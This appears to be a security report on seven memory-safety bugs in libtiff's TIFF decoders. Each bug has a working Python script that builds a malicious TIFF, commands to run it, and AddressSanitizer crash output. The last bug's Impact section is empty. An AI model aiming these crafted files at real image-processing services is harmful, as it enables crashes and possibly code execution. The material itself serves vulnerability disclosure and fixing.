# libtiff Vulnerabilities

## Bug1: Heap OOB Read in checkInkNamesString via Crafted INKNAMES Tag

`checkInkNamesString()` in `libtiff/tif_dir.c` (lines 119-125) dereferences the loop pointer `*cp` before performing the boundary check `if (cp >= ep)`, allowing a crafted TIFF with a `TIFFTAG_INKNAMES` value containing fewer null-terminated names than `TIFFTAG_SAMPLESPERPIXEL` to advance the pointer one byte past the allocated buffer and trigger a heap out-of-bounds read on the next loop iteration.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffsplit binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUT = "poc_input.tif"

def pack_ifd_entry(tag, type_, count, value):
    return struct.pack("<HHII", tag, type_, count, value)

N_ENTRIES = 10
IFD_OFFSET = 8
IFD_SIZE = 2 + N_ENTRIES * 12 + 4
DATA_OFFSET = IFD_OFFSET + IFD_SIZE

PIXEL_DATA = b'\x00' * 3

# INKNAMES = "ab" (2 bytes, no null terminator in raw data)
# slen=2, libtiff allocates 3 bytes and appends sentinel '\0' at position 2
# count=2 <= 4 bytes, stored inline in the IFD value_or_offset field
INKNAMES_INLINE = struct.unpack("<I", b'ab\x00\x00')[0]

entries = [
    pack_ifd_entry(0x0100, 3, 1, 1),               # ImageWidth = 1
    pack_ifd_entry(0x0101, 3, 1, 1),               # ImageLength = 1
    pack_ifd_entry(0x0102, 3, 1, 8),               # BitsPerSample = 8
    pack_ifd_entry(0x0103, 3, 1, 1),               # Compression = 1 (none)
    pack_ifd_entry(0x0106, 3, 1, 5),               # PhotometricInterpretation = 5 (Separated)
    pack_ifd_entry(0x0111, 4, 1, DATA_OFFSET),     # StripOffsets
    pack_ifd_entry(0x0115, 3, 1, 3),               # SamplesPerPixel = 3
    pack_ifd_entry(0x0116, 3, 1, 1),               # RowsPerStrip = 1
    pack_ifd_entry(0x0117, 4, 1, 3),               # StripByteCounts = 3
    pack_ifd_entry(0x014D, 2, 2, INKNAMES_INLINE), # INKNAMES = "ab" (ASCII, count=2, inline)
]

ifd_data = struct.pack("<H", N_ENTRIES)
for e in entries:
    ifd_data += e
ifd_data += struct.pack("<I", 0)

header = struct.pack("<HHI", 0x4949, 0x002A, IFD_OFFSET)

tiff_data = header + ifd_data + PIXEL_DATA

with open(OUT, "wb") as f:
    f.write(tiff_data)

print(f"Written {len(tiff_data)} bytes to {OUT}")
print("SamplesPerPixel=3, INKNAMES='ab' (slen=2) -> expects 3 names, finds 0 complete names -> OOB")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000073 at pc 0x7fbd6263f5e5 bp 0x7fff65548520 sp 0x7fff65548510
READ of size 1 at 0x502000000073 thread T0
    #0 0x7fbd6263f5e4 in checkInkNamesString (libtiff.so.3+0x2745e4)
    #1 0x7fbd62646a4b in _TIFFVSetField (libtiff.so.3+0x27ba4b)

### Impact

An attacker can supply a crafted TIFF file that causes `tiffsplit` (or any application calling `TIFFOpen`/`TIFFReadDirectory`) to read heap memory beyond the allocated INKNAMES buffer, potentially disclosing adjacent heap contents such as allocator metadata or other in-flight data. If heap layout conditions cause the out-of-bounds bytes to be zero, a secondary out-of-bounds read occurs inside `_TIFFsetNString` via `_TIFFmemcpy`, amplifying the information disclosure. The vulnerability is reachable with no authentication from a remotely supplied file, making it exploitable for denial of service or information leakage in any TIFF-processing pipeline that accepts untrusted input.

<!-- REPORT_SOURCE: libtiff_tif_dir_c#001 -->
<!-- DEDUP: checkInkNamesString::CWE-125 -->

## Bug2: NeXTDecode Heap Buffer Overflow via Exhausted Compressed Data

In `NeXTDecode()` in `libtiff/tif_next.c`, the per-scanline type byte is read unconditionally at line 69 (`n = *bp++, cc--`) without first checking whether the raw compressed buffer is exhausted, and when `cc` wraps to `-1` the only remaining guard (`if (cc == 0) goto bad`) is permanently bypassed, enabling unbounded out-of-bounds reads from the heap.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffcp binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

TIFF_LITTLEENDIAN       = 0x4949
TIFF_MAGIC              = 42

TAG_IMAGEWIDTH          = 256
TAG_IMAGELENGTH         = 257
TAG_BITSPERSAMPLE       = 258
TAG_COMPRESSION         = 259
TAG_PHOTOMETRIC         = 262
TAG_FILLORDER           = 266
TAG_STRIPOFFSETS        = 273
TAG_SAMPLESPERPIXEL     = 277
TAG_ROWSPERSTRIP        = 278
TAG_STRIPBYTECOUNTS     = 279

TYPE_SHORT  = 3
TYPE_LONG   = 4

COMPRESSION_NEXT    = 32766
FILLORDER_LSB2MSB   = 2

IMAGE_WIDTH     = 1024
IMAGE_LENGTH    = 2
ROWS_PER_STRIP  = 2
STRIP_BYTECOUNT = IMAGE_WIDTH   # 1024

STRIP_DATA = bytes([0x80] * STRIP_BYTECOUNT)

def ifd_entry(tag, type_, count, value):
    return struct.pack('<HHII', tag, type_, count, value)

def build_tiff():
    n_entries    = 10
    header_size  = 8
    ifd_size     = 2 + n_entries * 12 + 4
    ifd_offset   = header_size
    strip_offset = ifd_offset + ifd_size   # 134

    entries = b''
    entries += ifd_entry(TAG_IMAGEWIDTH,       TYPE_LONG,  1, IMAGE_WIDTH)
    entries += ifd_entry(TAG_IMAGELENGTH,      TYPE_LONG,  1, IMAGE_LENGTH)
    entries += ifd_entry(TAG_BITSPERSAMPLE,    TYPE_SHORT, 1, 1)
    entries += ifd_entry(TAG_COMPRESSION,      TYPE_SHORT, 1, COMPRESSION_NEXT)
    entries += ifd_entry(TAG_PHOTOMETRIC,      TYPE_SHORT, 1, 1)
    entries += ifd_entry(TAG_FILLORDER,        TYPE_SHORT, 1, FILLORDER_LSB2MSB)
    entries += ifd_entry(TAG_STRIPOFFSETS,     TYPE_LONG,  1, strip_offset)
    entries += ifd_entry(TAG_SAMPLESPERPIXEL,  TYPE_SHORT, 1, 1)
    entries += ifd_entry(TAG_ROWSPERSTRIP,     TYPE_LONG,  1, ROWS_PER_STRIP)
    entries += ifd_entry(TAG_STRIPBYTECOUNTS,  TYPE_LONG,  1, STRIP_BYTECOUNT)

    header = struct.pack('<HHI', TIFF_LITTLEENDIAN, TIFF_MAGIC, ifd_offset)
    ifd    = struct.pack('<H', n_entries) + entries + struct.pack('<I', 0)
    return header + ifd + STRIP_DATA

if __name__ == '__main__':
    tiff_bytes = build_tiff()
    with open('poc_input.tif', 'wb') as fh:
        fh.write(tiff_bytes)
    print(f"[+] Written {len(tiff_bytes)} bytes to poc_input.tif")
    print("    FillOrder=2 forces heap path; StripByteCounts=1024 -> exact heap alloc")
    print("    Strip: 0x80*1024 -> after TIFFReverseBits: 0x01*1024 (1 px/code)")
    print("    Scanline 0 consumes all 1024 bytes; scanline 1 reads byte[1024] = ASAN red zone")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x519000000e80 at pc 0x7f55b5498a4d bp 0x7fff1a195410 sp 0x7fff1a195400
READ of size 1 at 0x519000000e80 thread T0
    #0 in NeXTDecode tif_next.c:69
    #1 in TIFFReadEncodedStrip
0x519000000e80 is located 0 bytes to the right of 1024-byte region [0x519000000a80, 0x519000000e80)

### Impact

An attacker who supplies a crafted TIFF file with NeXT compression (tag value 32766) can trigger unbounded out-of-bounds heap reads in `NeXTDecode`, disclosing adjacent heap contents such as internal pointers or other image data. When the out-of-bounds reads reach an unmapped memory page the process receives SIGSEGV, causing reliable denial of service in any application that decodes NeXT-compressed TIFF images. The attack requires only that the target application open and decode an attacker-supplied TIFF file, which is a common operation in image viewers, media processors, and document conversion pipelines.

<!-- REPORT_SOURCE: libtiff_tif_next_c#001 -->
<!-- DEDUP: NeXTDecode::CWE-125 -->

## Bug3: JBIGDecode ignores size parameter leading to heap buffer overflow

In `JBIGDecode()` in `libtiff/tif_jbig.c`, the function explicitly discards the caller-supplied `size` parameter at line 82 and then at line 125 copies the fully decoded JBIG image into `buffer` using the attacker-controlled BIE-header dimension via `jbg_dec_getsize(&decoder)`, overflowing the heap-allocated buffer by up to 8184 bytes.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffcp binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_PATH = "poc_input.tif"

# Valid JBIG BIE for a 256x256 all-white bilevel image (1 plane, 1 stripe).
# BIH (20 bytes): DL=0 D=0 P=1 reserved=0 X_D=256 Y_D=256 L0=256
#                 Mx=0 My=0 order=0 options=0
# Arithmetic-coded stripe data followed by zero-padding to 1024 bytes.
BIE_DATA = (
    b'\x00\x00\x01\x00'   # DL=0 D=0 P=1 reserved=0
    b'\x00\x00\x01\x00'   # X_D = 256 (big-endian)
    b'\x00\x00\x01\x00'   # Y_D = 256 (big-endian)
    b'\x00\x00\x01\x00'   # L0  = 256 (big-endian, single stripe)
    b'\x00\x00\x00\x00'   # Mx=0 My=0 order=0 options=0
    b'\x4b\xc8\xff\x02'   # arithmetic-coded stripe data (all-white, 256x256)
    + bytes(1000)          # zero-pad to 1024 bytes total
)
assert len(BIE_DATA) == 1024
assert struct.unpack(">I", BIE_DATA[4:8])[0]  == 256, "X_D mismatch"
assert struct.unpack(">I", BIE_DATA[8:12])[0] == 256, "Y_D mismatch"

# Build TIFF (little-endian):
#   Offset   0: header (8 bytes)
#   Offset   8: IFD (2 + 10*12 + 4 = 126 bytes)
#   Offset 134: JBIG BIE strip (1024 bytes)
IFD_WIDTH    = 8
IFD_HEIGHT   = 8
STRIP_OFFSET = 8 + 2 + 10 * 12 + 4   # = 134

TIFF_SHORT = 3
TIFF_LONG  = 4

# IFD declares tiny 8x8 image so libtiff allocates only 8 bytes for the strip
# buffer. FillOrder=2 (LSB2MSB) prevents TIFFReverseBits() from scrambling the
# BIE header before jbg_dec_in sees it.
ifd_entries = [
    (0x0100, TIFF_SHORT, 1, IFD_WIDTH),          # ImageWidth  = 8
    (0x0101, TIFF_SHORT, 1, IFD_HEIGHT),          # ImageLength = 8
    (0x0102, TIFF_SHORT, 1, 1),                   # BitsPerSample = 1
    (0x0103, TIFF_SHORT, 1, 34661),               # Compression = JBIG (0x8765)
    (0x0106, TIFF_SHORT, 1, 1),                   # PhotometricInterpretation = BlackIsZero
    (0x010A, TIFF_SHORT, 1, 2),                   # FillOrder = FILLORDER_LSB2MSB
    (0x0111, TIFF_LONG,  1, STRIP_OFFSET),        # StripOffsets
    (0x0115, TIFF_SHORT, 1, 1),                   # SamplesPerPixel
    (0x0116, TIFF_LONG,  1, IFD_HEIGHT),          # RowsPerStrip = 8
    (0x0117, TIFF_LONG,  1, len(BIE_DATA)),       # StripByteCounts = 1024
]

header = struct.pack("<2sHI", b"II", 42, 8)

ifd = struct.pack("<H", len(ifd_entries))
for tag, typ, cnt, val in ifd_entries:
    ifd += struct.pack("<HHI", tag, typ, cnt)
    if typ == TIFF_SHORT:
        ifd += struct.pack("<HH", val, 0)
    else:
        ifd += struct.pack("<I", val)
ifd += struct.pack("<I", 0)   # next IFD = 0

tiff_data = header + ifd + BIE_DATA
assert len(header) + len(ifd) == STRIP_OFFSET, "strip offset mismatch"

with open(OUTPUT_PATH, "wb") as f:
    f.write(tiff_data)

buf_alloc = (IFD_WIDTH * IFD_HEIGHT + 7) // 8    # 8 bytes
memcpy_sz = (256 * 256 + 7) // 8                  # 8192 bytes
print(f"[+] Written: {OUTPUT_PATH}  ({len(tiff_data)} bytes)")
print(f"    IFD dims  : {IFD_WIDTH}x{IFD_HEIGHT}  -> libtiff alloc = {buf_alloc} bytes")
print(f"    BIE dims  : 256x256      -> _TIFFmemcpy = {memcpy_sz} bytes")
print(f"    Overflow  : {memcpy_sz - buf_alloc} bytes past end of heap buffer")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffcp -c none poc_input.tif /tmp/out_.tif || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000078 at pc 0x7f7be70ef2c3 bp 0x7ffc9177a300 sp 0x7ffc91779aa8
WRITE of size 8192 into 8-byte allocation
  #0 __interceptor_memcpy (sanitizer_common_interceptors.inc:827)
  #1 JBIGDecode tif_jbig.c:125

### Impact

An attacker who supplies a crafted TIFF file with JBIG compression can cause a heap buffer overflow of up to 8184 bytes, overwriting adjacent heap objects such as function pointers or heap metadata. This overflow is reachable through any application that calls `TIFFReadEncodedStrip` on a JBIG-compressed TIFF, including the `tiffcp` transcoding tool. In the worst case the attacker achieves arbitrary code execution and in the best case causes a reliable process crash constituting a denial of service.

<!-- REPORT_SOURCE: libtiff_tif_jbig_c#001 -->
<!-- DEDUP: JBIGDecode::CWE-122 -->

## Bug4: Heap Buffer Overflow in fpAcc via Non-Multiple-of-8 BitsPerSample with Floating-Point Predictor

In `fpAcc()` in `libtiff/tif_predict.c` (lines 352–383), the accumulation loop executes `REPEAT4(stride, cp[stride] += cp[0]; cp++)` without verifying that the strip row size is a multiple of `stride`, so when `BitsPerSample` is not a multiple of 8 the final loop iteration writes past the end of the heap-allocated strip buffer causing a heap buffer overflow.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffcp binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct
import zlib

OUTPUT_PATH = 'poc_input.tif'

TYPE_SHORT = 3
TYPE_LONG  = 4

TAG_IMAGEWIDTH        = 0x0100
TAG_IMAGELENGTH       = 0x0101
TAG_BITSPERSAMPLE     = 0x0102
TAG_COMPRESSION       = 0x0103
TAG_PHOTOMETRIC       = 0x0106
TAG_STRIPOFFSETS      = 0x0111
TAG_SAMPLESPERPIXEL   = 0x0115
TAG_ROWSPERSTRIP      = 0x0116
TAG_STRIPBYTECOUNTS   = 0x0117
TAG_PLANARCONFIG      = 0x011C
TAG_PREDICTOR         = 0x013D
TAG_SAMPLEFORMAT      = 0x0153

WIDTH               = 3
HEIGHT              = 1
BITS_PER_SAMPLE     = 9   # non-multiple-of-8 triggers the overflow
COMPRESSION_DEFLATE = 8
PHOTOMETRIC         = 1
SAMPLES_PER_PIXEL   = 5   # stride=5; rowsize=17, 17%5=2 causes misalignment
ROWS_PER_STRIP      = 1
PLANARCONFIG_CONTIG = 1
PREDICTOR_FP        = 3   # PREDICTOR_FLOATINGPOINT -> routes to fpAcc()
SAMPLEFORMAT_IEEEFP = 3   # required for floating-point predictor path


def make_tag(tag, type_, count, value):
    return struct.pack('<HHII', tag, type_, count, value)


RAW_SIZE = (BITS_PER_SAMPLE * WIDTH * SAMPLES_PER_PIXEL + 7) // 8  # = 17
raw_strip = bytes(RAW_SIZE)
compressed_strip = zlib.compress(raw_strip, level=1)
compressed_size  = len(compressed_strip)

NUM_TAGS    = 12
IFD_OFFSET  = 8
IFD_SIZE    = 2 + NUM_TAGS * 12 + 4
STRIP_OFFSET = IFD_OFFSET + IFD_SIZE

header = struct.pack('<2sHI', b'II', 42, IFD_OFFSET)

entries = [
    make_tag(TAG_IMAGEWIDTH,      TYPE_SHORT, 1, WIDTH),
    make_tag(TAG_IMAGELENGTH,     TYPE_SHORT, 1, HEIGHT),
    make_tag(TAG_BITSPERSAMPLE,   TYPE_SHORT, 1, BITS_PER_SAMPLE),
    make_tag(TAG_COMPRESSION,     TYPE_SHORT, 1, COMPRESSION_DEFLATE),
    make_tag(TAG_PHOTOMETRIC,     TYPE_SHORT, 1, PHOTOMETRIC),
    make_tag(TAG_STRIPOFFSETS,    TYPE_LONG,  1, STRIP_OFFSET),
    make_tag(TAG_SAMPLESPERPIXEL, TYPE_SHORT, 1, SAMPLES_PER_PIXEL),
    make_tag(TAG_ROWSPERSTRIP,    TYPE_SHORT, 1, ROWS_PER_STRIP),
    make_tag(TAG_STRIPBYTECOUNTS, TYPE_LONG,  1, compressed_size),
    make_tag(TAG_PLANARCONFIG,    TYPE_SHORT, 1, PLANARCONFIG_CONTIG),
    make_tag(TAG_PREDICTOR,       TYPE_SHORT, 1, PREDICTOR_FP),
    make_tag(TAG_SAMPLEFORMAT,    TYPE_SHORT, 1, SAMPLEFORMAT_IEEEFP),
]

ifd = struct.pack('<H', NUM_TAGS) + b''.join(entries) + struct.pack('<I', 0)
tiff_bytes = header + ifd + compressed_strip

with open(OUTPUT_PATH, 'wb') as f:
    f.write(tiff_bytes)

print(f"[+] Wrote {len(tiff_bytes)} bytes to {OUTPUT_PATH}")
print(f"    RAW_SIZE={RAW_SIZE}  stride={SAMPLES_PER_PIXEL}  "
      f"remainder={RAW_SIZE % SAMPLES_PER_PIXEL}  "
      f"overflow_bytes={SAMPLES_PER_PIXEL - RAW_SIZE % SAMPLES_PER_PIXEL}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffcp poc_input.tif /tmp/out_.tif || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x503000000051 at pc 0x7f893677466c bp 0x7ffe77b110e0 sp 0x7ffe77b110d0
READ of size 1 at 0x503000000051 thread T0
    #0 0x7f893677466b in fpAcc (libtiff.so.3+0x3d566b)
    #1 0x7f893677544a in PredictorDecodeTile (libtiff.so.3+0x3d644a)
0x503000000051 is located 0 bytes to the right of 17-byte region [0x503000000040,0x503000000051)

### Impact

A remote attacker can supply a crafted TIFF file with `BitsPerSample=9`, `SamplesPerPixel=5`, `Predictor=3`, and `SampleFormat=SAMPLEFORMAT_IEEEFP` to cause `fpAcc()` to write three bytes past the end of a heap-allocated strip buffer, corrupting adjacent heap metadata or objects with attacker-influenced accumulated delta values. Any application or tool that decodes TIFF strips through `TIFFReadEncodedStrip()` or `TIFFReadScanline()` is exposed to this attack surface, including `tiffcp`, `tiff2pdf`, and image-loading libraries that wrap libtiff. In the worst case the heap corruption enables arbitrary code execution, and in the minimum case it causes a reliable process crash constituting denial of service.

<!-- REPORT_SOURCE: libtiff_tif_predict_c#001 -->
<!-- DEDUP: fpAcc::CWE-122 -->

## Bug5: TIFFReadRawStrip1 mmap bounds-check uint32 overflow leads to out-of-bounds read

In `TIFFReadRawStrip1()` in `libtiff/tif_read.c` (lines 197–209), the mmap bounds check adds `td_stripoffset[strip]` (uint32) and `size` (int32) in 32-bit unsigned arithmetic without overflow protection, allowing a crafted TIFF with `StripOffset=0xFFFFFF00` and `StripByteCount=256` to wrap the sum to zero, bypass the guard, and trigger an out-of-bounds read via `_TIFFmemcpy` far beyond the memory-mapped file region.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffsplit binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct
import sys

SHORT    = 3
LONG     = 4
RATIONAL = 5

def ifd_entry(tag, typ, count, value):
    return struct.pack('<HHII', tag, typ, count, value)

def create_vuln_tiff(output_path):
    ifd_offset   = 8
    num_entries  = 11
    ifd_end      = ifd_offset + 2 + num_entries * 12 + 4   # = 146
    xres_offset  = ifd_end
    yres_offset  = xres_offset + 8

    STRIP_OFFSET     = 0xFFFFFF00
    STRIP_BYTECOUNT  = 256

    entries = [
        ifd_entry(0x0100, SHORT,    1, 4),
        ifd_entry(0x0101, SHORT,    1, 4),
        ifd_entry(0x0102, SHORT,    1, 8),
        ifd_entry(0x0103, SHORT,    1, 1),
        ifd_entry(0x0106, SHORT,    1, 1),
        ifd_entry(0x0111, LONG,     1, STRIP_OFFSET),
        ifd_entry(0x0115, SHORT,    1, 1),
        ifd_entry(0x0116, SHORT,    1, 4),
        ifd_entry(0x0117, LONG,     1, STRIP_BYTECOUNT),
        ifd_entry(0x011A, RATIONAL, 1, xres_offset),
        ifd_entry(0x011B, RATIONAL, 1, yres_offset),
    ]

    header    = struct.pack('<HHI', 0x4949, 42, ifd_offset)
    ifd_block = struct.pack('<H', num_entries) + b''.join(entries) + struct.pack('<I', 0)
    xres_data = struct.pack('<II', 72, 1)
    yres_data = struct.pack('<II', 72, 1)

    tiff_bytes = header + ifd_block + xres_data + yres_data

    with open(output_path, 'wb') as f:
        f.write(tiff_bytes)

    file_size    = len(tiff_bytes)
    overflow_sum = (STRIP_OFFSET + STRIP_BYTECOUNT) & 0xFFFFFFFF
    print(f"[+] Created: {output_path}  ({file_size} bytes)")
    print(f"[+] StripOffsets[0]    = 0x{STRIP_OFFSET:08X}")
    print(f"[+] StripByteCounts[0] = {STRIP_BYTECOUNT}")
    print(f"[+] uint32 overflow:   0x{STRIP_OFFSET:08X} + {STRIP_BYTECOUNT} = 0x{overflow_sum:08X} (wraps to {overflow_sum})")
    print(f"[+] Bounds check:      '{overflow_sum} > {file_size}' = False => bypassed!")

if __name__ == '__main__':
    out = sys.argv[1] if len(sys.argv) > 1 else 'poc_input.tif'
    create_vuln_tiff(out)
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: SEGV on unknown address 0x7f2ec53d8f00 (pc 0x7f2dc89f7881 bp 0x7ffd86e90cf0 sp 0x7ffd86e90cb8 T0). The signal is caused by a READ memory access. #0 0x7f2dc89f7881 in memcpy (/lib/x86_64-linux-gnu/libc.so.6+0xc4881). #1 0x7f2dc90ef225 in _TIFFmemcpy (libtiff.so.3+0x3fc225).

### Impact

An attacker who supplies a crafted TIFF file can cause `tiffsplit` (or any application that calls `TIFFReadRawStrip`) to perform an out-of-bounds read via `_TIFFmemcpy` from an address approximately 4 GiB beyond the memory-mapped file region, reliably producing a SIGSEGV crash and denial of service. If the out-of-bounds address happens to fall within another mapped region (such as a shared library or heap), the read can copy sensitive process memory into the caller's buffer, resulting in information disclosure. On 32-bit targets, the address wrap-around can additionally cause the memcpy to read from an attacker-influenced in-process location, potentially escalating the impact to exploitable heap corruption.

<!-- REPORT_SOURCE: libtiff_tif_read_c#001 -->
<!-- DEDUP: TIFFReadRawStrip1::CWE-125 -->

## Bug6: LZWPreDecode out-of-bounds read of rawdata[1] when StripByteCount equals one

`LZWPreDecode()` in `tif_lzw.c` at line 268 reads `tif->tif_rawdata[1]` without first verifying that `tif_rawcc` is at least 2, which allows a crafted TIFF file whose single-byte LZW strip is positioned at the last byte of the mmap region to cause an out-of-bounds read one byte past the end of the mapped file page.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffinfo binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

PAGE_SIZE = 4096

def make_tiff():
    header_size = 8
    num_tags    = 9
    ifd_size    = 2 + num_tags * 12 + 4   # 114 bytes
    ifd_end     = header_size + ifd_size   # 122

    # Strip byte must sit at the very last byte of a page-aligned file
    strip_data_offset = PAGE_SIZE - 1      # 4095
    file_size         = PAGE_SIZE          # 4096
    pad_size          = strip_data_offset - ifd_end  # 3973

    header  = b'II'
    header += struct.pack('<H', 42)
    header += struct.pack('<I', header_size)   # IFD at offset 8

    entries = []
    entries.append(struct.pack('<HHII', 256, 4, 1, 1))                   # ImageWidth=1
    entries.append(struct.pack('<HHII', 257, 4, 1, 1))                   # ImageLength=1
    entries.append(struct.pack('<HHII', 258, 3, 1, 8))                   # BitsPerSample=8
    entries.append(struct.pack('<HHII', 259, 3, 1, 5))                   # Compression=5 (LZW)
    entries.append(struct.pack('<HHII', 262, 3, 1, 1))                   # PhotometricInterpretation=1
    entries.append(struct.pack('<HHII', 273, 4, 1, strip_data_offset))   # StripOffsets=4095
    entries.append(struct.pack('<HHII', 277, 3, 1, 1))                   # SamplesPerPixel=1
    entries.append(struct.pack('<HHII', 278, 4, 1, 1))                   # RowsPerStrip=1
    entries.append(struct.pack('<HHII', 279, 4, 1, 1))                   # StripByteCounts=1

    ifd  = struct.pack('<H', num_tags)
    for e in entries:
        ifd += e
    ifd += struct.pack('<I', 0)   # next IFD = 0

    padding    = b'\x00' * pad_size
    strip_data = b'\x00'   # rawdata[0]==0x00 triggers the rawdata[1] access

    tiff_data = header + ifd + padding + strip_data

    assert len(tiff_data) == file_size
    assert len(tiff_data) % PAGE_SIZE == 0
    assert tiff_data[strip_data_offset] == 0x00

    return tiff_data

if __name__ == '__main__':
    data = make_tiff()
    with open('poc_input.tif', 'wb') as f:
        f.write(data)
    print('[+] poc_input.tif written (4096 bytes; strip byte at offset 4095)')
    print('    rawdata[0] = 0x00 (last byte of mmap page)')
    print('    rawdata[1] = first byte of unmapped page => OOB Read')
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffinfo -D -d poc_input.tif || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==2851317==ERROR: AddressSanitizer: unknown-crash on address 0x7fc554e3f000 at pc 0x7fc5589c46de bp 0x7fff680a7e70 sp 0x7fff680a7e60
READ of size 1 at 0x7fc554e3f000 thread T0
    #0 0x7fc5589c46dd in LZWPreDecode (libtiff.so.3+0x36c6dd)
    #1 0x7fc558a47062 in TIFFStartStrip (libtiff.so.3+0x3ef062)

### Impact

An attacker who can supply a crafted TIFF file can trigger a one-byte out-of-bounds read past the end of the mmap region in `LZWPreDecode()`, causing a wild-pointer dereference that immediately crashes the calling process and produces a denial-of-service condition. On non-mmap code paths the same missing bounds check allows `LZWPreDecode()` to read an uninitialized or stale heap byte and use its value to select the legacy `LZWDecodeCompat` decoder, potentially leaking heap state as a side-channel or producing incorrect decode output in downstream processing. The attack requires only that the target application calls `TIFFReadEncodedStrip` or an equivalent decoded-read API on the malicious file; no authentication or privileges are required beyond the ability to supply an input file.

<!-- REPORT_SOURCE: libtiff_tif_lzw_c#001 -->
<!-- DEDUP: LZWPreDecode::CWE-125 -->

## Bug7: TIFFReadRawTile1 uint32 overflow bypasses mmap bounds check causing OOB read

In `TIFFReadRawTile1()` in `tif_read.c` (lines 440-451), the mmap branch computes `td_stripoffset[tile] + size` using 32-bit unsigned arithmetic with no overflow guard, so a crafted `TileOffsets` value of `0xFFFFFF00` combined with `TileByteCounts` of `256` wraps the sum to zero and causes the bounds check to pass, after which `_TIFFmemcpy` reads 256 bytes from approximately 4 GB past the mapped file base.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffsplit binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUT = "poc_input.tif"

def pack_ifd_entry(tag, typ, count, value):
    return struct.pack("<HHII", tag, typ, count, value)

SHORT = 3
LONG  = 4

HEADER_SIZE  = 8
IFD_OFFSET   = 8
NUM_ENTRIES  = 13
IFD_SIZE     = 2 + NUM_ENTRIES * 12 + 4
XRES_OFFSET  = IFD_OFFSET + IFD_SIZE
YRES_OFFSET  = XRES_OFFSET + 8
TOTAL_SIZE   = YRES_OFFSET + 8

entries = []
entries.append(pack_ifd_entry(0x0100, LONG,  1, 16))
entries.append(pack_ifd_entry(0x0101, LONG,  1, 16))
entries.append(pack_ifd_entry(0x0102, SHORT, 1, 8))
entries.append(pack_ifd_entry(0x0103, SHORT, 1, 1))
entries.append(pack_ifd_entry(0x0106, SHORT, 1, 1))
entries.append(pack_ifd_entry(0x0115, SHORT, 1, 1))
entries.append(pack_ifd_entry(0x011A, 5,     1, XRES_OFFSET))
entries.append(pack_ifd_entry(0x011B, 5,     1, YRES_OFFSET))
entries.append(pack_ifd_entry(0x0128, SHORT, 1, 2))
entries.append(pack_ifd_entry(0x0142, LONG,  1, 16))
entries.append(pack_ifd_entry(0x0143, LONG,  1, 16))
entries.append(pack_ifd_entry(0x0144, LONG,  1, 0xFFFFFF00))
entries.append(pack_ifd_entry(0x0145, LONG,  1, 256))

header  = b'\x49\x49'
header += struct.pack("<H", 42)
header += struct.pack("<I", IFD_OFFSET)

ifd  = struct.pack("<H", NUM_ENTRIES)
ifd += b''.join(entries)
ifd += struct.pack("<I", 0)

xres = struct.pack("<II", 72, 1)
yres = struct.pack("<II", 72, 1)

data = header + ifd + xres + yres

with open(OUT, "wb") as f:
    f.write(data)

print(f"[+] Written {len(data)} bytes to {OUT}")
print(f"    TileOffsets[0]    = 0xFFFFFF00")
print(f"    TileByteCounts[0] = 256")
print(f"    uint32 sum        = {(0xFFFFFF00 + 256) & 0xFFFFFFFF} (overflows to 0)")
print(f"    tif_size          = {len(data)} bytes")
print(f"    Bounds check:  0 > {len(data)}  -> False  -> proceeds to OOB read")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer:DEADLYSIGNAL
ERROR: AddressSanitizer: SEGV on unknown address 0x7f6b85975f00 (pc 0x7f6a88e94881 bp 0x7fff7aaa9380 sp 0x7fff7aaa9348 T0)
SUMMARY: AddressSanitizer: SEGV (/lib/x86_64-linux-gnu/libc.so.6+0xc4881) in memcpy

### Impact

